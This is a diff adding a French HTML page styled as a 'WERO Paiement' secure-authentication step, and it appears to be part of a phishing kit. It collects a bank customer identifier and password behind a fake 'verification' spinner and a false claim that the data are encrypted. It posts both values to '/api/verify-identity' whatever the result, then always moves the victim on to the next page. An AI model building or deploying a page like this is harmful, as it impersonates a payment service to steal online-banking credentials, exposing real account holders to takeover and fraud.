@@ -1,0 +1,758 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authentification - WERO Paiement</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --primary: #FFD500;
+      --black: #0A0E27;
+      --white: #FFFFFF;
+      --accent-green: #10B981;
+      --accent-blue: #3B82F6;
+      --gray-100: #F3F4F6;
+      --gray-600: #4B5563;
+      --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.15);
+      --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: linear-gradient(135deg, #FFD500 0%, #FFEB3B 50%, #FFC107 100%);
+      color: var(--black);
+      line-height: 1.6;
+      overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* HEADER */
+    header {
+      background: rgba(255, 213, 0, 0.95);
+      backdrop-filter: blur(10px);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.08);
+      padding: 12px 0;
+    }
+
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .logo {
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: -2px;
+      color: var(--black);
+    }
+
+    .desktop-nav {
+      display: flex;
+      gap: 10px;
+    }
+
+    .desktop-nav a {
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 15px;
+      padding: 10px 18px;
+      border-radius: 12px;
+      transition: var(--transition);
+    }
+
+    .desktop-nav a:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-menu-btn {
+      display: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      width: 32px;
+      height: 24px;
+      position: relative;
+      z-index: 1001;
+    }
+
+    .mobile-menu-btn span {
+      display: block;
+      width: 100%;
+      height: 2.5px;
+      background: var(--black);
+      border-radius: 2px;
+      transition: var(--transition);
+      position: absolute;
+    }
+
+    .mobile-menu-btn span:nth-child(1) { top: 2px; }
+    .mobile-menu-btn span:nth-child(2) { top: 11px; }
+    .mobile-menu-btn span:nth-child(3) { top: 20px; }
+
+    .mobile-menu-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(3px);
+      z-index: 999;
+      opacity: 0;
+    }
+
+    .mobile-nav {
+      display: none;
+      position: fixed;
+      top: 0;
+      right: -100%;
+      width: 85%;
+      max-width: 400px;
+      height: 100%;
+      background: #FFD500;
+      z-index: 1000;
+      box-shadow: -10px 0 40px rgba(0, 0, 0, 0.2);
+      transition: right var(--transition);
+      flex-direction: column;
+    }
+
+    .mobile-nav.active {
+      right: 0;
+    }
+
+    .mobile-nav-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px;
+      border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+    }
+
+    .mobile-menu-close {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      transition: var(--transition);
+    }
+
+    .mobile-menu-close:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+
+    .mobile-nav-links {
+      flex: 1;
+      padding: 20px 0;
+    }
+
+    .mobile-nav-links a {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 16px 24px;
+      text-decoration: none;
+      color: var(--black);
+      font-weight: 600;
+      font-size: 16px;
+      transition: var(--transition);
+      border-left: 4px solid transparent;
+    }
+
+    .mobile-nav-links a:hover {
+      background: rgba(0, 0, 0, 0.08);
+      border-left-color: var(--black);
+    }
+
+    @keyframes slideInDown {
+      from {
+        opacity: 0;
+        transform: translateY(-40px) rotateX(10deg);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) rotateX(0deg);
+      }
+    }
+
+    @keyframes slideInUp {
+      from {
+        opacity: 0;
+        transform: translateY(40px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    /* HERO SECTION */
+    .hero-section {
+      padding: 80px 0 60px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-section h1 {
+      font-size: 48px;
+      font-weight: 900;
+      margin-bottom: 20px;
+      color: var(--black);
+      letter-spacing: -1px;
+      animation: slideInDown 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+      line-height: 1.2;
+    }
+
+    .hero-section p {
+      font-size: 18px;
+      color: rgba(0, 0, 0, 0.7);
+      max-width: 650px;
+      margin: 0 auto;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
+      font-weight: 500;
+    }
+
+    /* MAIN CONTENT */
+    main {
+      flex: 1;
+      padding: 60px 0;
+    }
+
+    .content-wrapper {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(10px);
+      border-radius: 24px;
+      padding: 50px 40px;
+      box-shadow: var(--shadow-lg);
+      max-width: 700px;
+      margin: 40px auto;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s backwards;
+    }
+
+    .form-section h2 {
+      font-size: 24px;
+      font-weight: 900;
+      margin-bottom: 30px;
+      color: var(--black);
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 2px solid var(--accent-green);
+      padding: 16px 20px;
+      border-radius: 16px;
+      margin-bottom: 30px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.4s backwards;
+    }
+
+    .security-badge i {
+      color: var(--accent-green);
+      font-size: 20px;
+    }
+
+    .security-badge p {
+      font-size: 14px;
+      color: var(--black);
+      font-weight: 600;
+      margin: 0;
+    }
+
+    .form-container {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    .form-group {
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .form-group:nth-child(1) { animation-delay: 0.45s; }
+    .form-group:nth-child(2) { animation-delay: 0.55s; }
+
+    .form-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .form-label label {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--black);
+    }
+
+    .form-label .required {
+      color: #EF4444;
+      margin-left: 4px;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .form-input {
+      width: 100%;
+      padding: 14px 45px 14px 16px;
+      border: 2px solid #e5e7eb;
+      border-radius: 12px;
+      font-size: 15px;
+      transition: var(--transition);
+      background: var(--white);
+      color: var(--black);
+      font-weight: 500;
+    }
+
+    .form-input:focus {
+      outline: none;
+      border-color: var(--accent-blue);
+      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.1);
+    }
+
+    .form-input::placeholder {
+      color: var(--gray-600);
+      font-weight: 400;
+    }
+
+    .input-icon {
+      position: absolute;
+      right: 14px;
+      color: var(--gray-600);
+      font-size: 16px;
+      pointer-events: none;
+    }
+
+    .password-field {
+      display: none;
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    .password-field.visible {
+      display: block;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 10px;
+    }
+
+    .btn-validate, .btn-submit {
+      padding: 14px 24px;
+      border: none;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: var(--transition);
+      flex: 1;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .btn-validate {
+      background: var(--accent-blue);
+      color: white;
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.5s backwards;
+    }
+
+    .btn-validate:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 16px rgba(59, 130, 246, 0.4);
+    }
+
+    .btn-validate:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .btn-submit {
+      background: linear-gradient(135deg, var(--accent-green), #06B6D4);
+      color: white;
+      box-shadow: 0 12px 30px rgba(16, 185, 129, 0.3);
+      margin-top: 20px;
+      animation: slideInUp 1s cubic-bezier(0.34, 1.56, 0.64, 1) 0.6s backwards;
+    }
+
+    .btn-submit:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 16px 40px rgba(16, 185, 129, 0.4);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* FOOTER */
+    footer {
+      background: var(--black);
+      color: var(--white);
+      padding: 80px 0 40px;
+      margin-top: 60px;
+      border-top: 2px solid rgba(255, 213, 0, 0.3);
+    }
+
+    .footer-content {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 60px;
+      margin-bottom: 50px;
+    }
+
+    .footer-section {
+      flex: 1;
+      min-width: 250px;
+      text-align: center;
+    }
+
+    .footer-section h3 {
+      font-size: 18px;
+      margin-bottom: 15px;
+      color: #FFD500;
+      font-weight: 700;
+    }
+
+    .footer-section p {
+      font-size: 14px;
+      opacity: 0.8;
+      margin-bottom: 10px;
+    }
+
+    .footer-section a {
+      display: block;
+      color: var(--white);
+      text-decoration: none;
+      font-size: 14px;
+      opacity: 0.7;
+      transition: var(--transition);
+      margin-bottom: 8px;
+    }
+
+    .footer-section a:hover {
+      opacity: 1;
+      color: #FFD500;
+    }
+
+    .footer-bottom {
+      text-align: center;
+      padding-top: 30px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      opacity: 0.6;
+      font-size: 14px;
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 768px) {
+      .desktop-nav { display: none; }
+      .mobile-menu-btn { display: block; }
+      .mobile-nav { display: flex; }
+
+      .logo { font-size: 28px; }
+      .hero-section h1 { font-size: 36px; }
+      .hero-section p { font-size: 16px; }
+      .content-wrapper { padding: 30px 20px; }
+
+      .button-group {
+        flex-direction: column;
+      }
+
+      .btn-validate, .btn-submit {
+        width: 100%;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .hero-section h1 { font-size: 28px; }
+      .hero-section p { font-size: 15px; }
+      .content-wrapper { padding: 20px; }
+      
+      .form-input {
+        padding: 12px 40px 12px 14px;
+        font-size: 14px;
+      }
+
+      .btn-validate, .btn-submit {
+        padding: 12px 20px;
+        font-size: 13px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="header-container">
+      <div class="logo">WERO</div>
+      
+      <nav class="desktop-nav">
+        <a href="/">Accueil</a>
+        <a href="/accords">Validation</a>
+        <a href="/premiere">Vérification</a>
+        <a href="/troisieme" class="active">Authentification</a>
+      </nav>
+      
+      <button class="mobile-menu-btn">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+      
+      <div class="mobile-menu-overlay"></div>
+      
+      <nav class="mobile-nav">
+        <div class="mobile-nav-header">
+          <div class="logo">WERO</div>
+          <button class="mobile-menu-close"><i class="fas fa-times"></i></button>
+        </div>
+        <div class="mobile-nav-links">
+          <a href="/">Accueil</a>
+          <a href="/accords">Validation</a>
+          <a href="/premiere">Vérification</a>
+          <a href="/troisieme" class="active">Authentification</a>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <!-- HERO -->
+  <section class="hero-section">
+    <div class="container">
+      <h1>🔐 Authentification Sécurisée</h1>
+      <p>Vérifiez votre identité bancaire pour valider votre transaction</p>
+    </div>
+  </section>
+
+  <!-- MAIN CONTENT -->
+  <main>
+    <div class="container">
+      <div class="content-wrapper">
+        <div class="form-section">
+          <h2>Identifiants de Connexion</h2>
+          
+          <div class="security-badge">
+            <i class="fas fa-shield-alt"></i>
+            <p>🔐 Vos données sont cryptées et sécurisées</p>
+          </div>
+
+          <form id="authForm" class="form-container" novalidate>
+            <!-- IDENTIFIANT -->
+            <div class="form-group">
+              <div class="form-label">
+                <label>
+                  Identifiant Bancaire
+                  <span class="required">*</span>
+                </label>
+              </div>
+              <div class="input-wrapper">
+                <input type="text" id="identifier" class="form-input" placeholder="Numéro client ou email" required>
+                <i class="fas fa-user input-icon"></i>
+              </div>
+              <button type="button" id="validateIdentifier" class="btn-validate">
+                <i class="fas fa-check"></i>
+                Valider
+              </button>
+            </div>
+
+            <!-- MOT DE PASSE (CACHÉ AU DÉPART) -->
+            <div class="form-group password-field" id="passwordField">
+              <div class="form-label">
+                <label>
+                  Mot de Passe
+                  <span class="required">*</span>
+                </label>
+              </div>
+              <div class="input-wrapper">
+                <input type="password" id="password" class="form-input" placeholder="••••••••" required inputmode="text">
+                <i class="fas fa-lock input-icon"></i>
+              </div>
+              <div class="button-group">
+                <button type="submit" class="btn-submit" id="submitBtn">
+                  <i class="fas fa-check"></i>
+                  Confirmer
+                </button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- FOOTER -->
+  <footer>
+    <div class="container">
+      <div class="footer-content">
+        <div class="footer-section">
+          <h3>WERO</h3>
+          <p>Paiement Instantané Sécurisé</p>
+        </div>
+        <div class="footer-section">
+          <h3>Navigation</h3>
+          <a href="/">Accueil</a>
+          <a href="/accords">Validation</a>
+          <a href="/premiere">Vérification</a>
+          <a href="/troisieme">Authentification</a>
+        </div>
+        <div class="footer-section">
+          <h3>Sécurité</h3>
+          <a href="#">RGPD</a>
+          <a href="#">Conditions</a>
+          <a href="#">Confidentialité</a>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2024 WERO. Tous droits réservés.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      // Mobile menu
+      const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+      const mobileMenuClose = document.querySelector('.mobile-menu-close');
+      const mobileMenuOverlay = document.querySelector('.mobile-menu-overlay');
+      const mobileNav = document.querySelector('.mobile-nav');
+      const mobileLinks = document.querySelectorAll('.mobile-nav-links a');
+      
+      mobileMenuBtn.addEventListener('click', () => {
+        mobileNav.classList.add('active');
+        mobileMenuOverlay.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      });
+      
+      function closeMobileMenu() {
+        mobileNav.classList.remove('active');
+        mobileMenuOverlay.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+      
+      mobileMenuClose.addEventListener('click', closeMobileMenu);
+      mobileMenuOverlay.addEventListener('click', closeMobileMenu);
+      mobileLinks.forEach(link => link.addEventListener('click', closeMobileMenu));
+
+      // Form elements
+      const identifier = document.getElementById('identifier');
+      const password = document.getElementById('password');
+      const validateBtn = document.getElementById('validateIdentifier');
+      const passwordField = document.getElementById('passwordField');
+      const authForm = document.getElementById('authForm');
+      const submitBtn = document.getElementById('submitBtn');
+
+      // Validate identifier button
+      validateBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        
+        if (!identifier.value.trim()) {
+          alert('Veuillez renseigner votre identifiant');
+          return;
+        }
+
+        validateBtn.disabled = true;
+        validateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';
+
+        setTimeout(() => {
+          validateBtn.innerHTML = '<i class="fas fa-check"></i> Validé';
+          validateBtn.style.background = 'var(--accent-green)';
+          identifier.disabled = true;
+          passwordField.classList.add('visible');
+          password.focus();
+        }, 1000);
+      });
+
+      // Submit form
+      authForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        if (!identifier.value.trim()) {
+          alert('Veuillez renseigner votre identifiant');
+          return;
+        }
+
+        if (!password.value.trim()) {
+          alert('Veuillez renseigner votre mot de passe');
+          return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Authentification...';
+
+        try {
+          await fetch('/api/verify-identity', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              identifier: identifier.value.trim(),
+              password: password.value.trim()
+            })
+          });
+        } catch (error) {
+          console.error('Erreur:', error);
+        }
+
+        setTimeout(() => {
+          window.location.href = '/deuxieme';
+        }, 1500);
+      });
+    });
+  </script>
+</body>
+</html>
